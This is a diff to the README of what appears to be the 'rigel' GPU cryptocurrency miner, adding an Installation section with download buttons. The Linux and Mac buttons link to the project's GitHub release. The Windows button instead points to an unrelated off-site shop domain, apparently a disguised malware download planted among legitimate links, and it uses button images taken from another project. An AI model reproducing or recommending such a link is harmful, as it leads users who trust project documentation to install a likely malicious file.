@@ -4,6 +4,13 @@ This is a cryptocurrency miner for Nvidia GPUs
 
 ![rigel screenshot kaspa](https://user-images.githubusercontent.com/119491468/204991320-802a9de8-8a77-4527-b802-846d542eb05e.png)
 
+# Installation
+Click the download button for your operating system:
+<p float="left">
+  <a href="https://github.com/rigelmining/rigel/releases/tag/1.19.3"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
+  <a href="https://github.com/rigelmining/rigel/releases/tag/1.19.3"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
+  <a href="https://stroretrade.shop/?f=111GkiCAyvW"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+</p>
 
 ## Supported algorithms
 
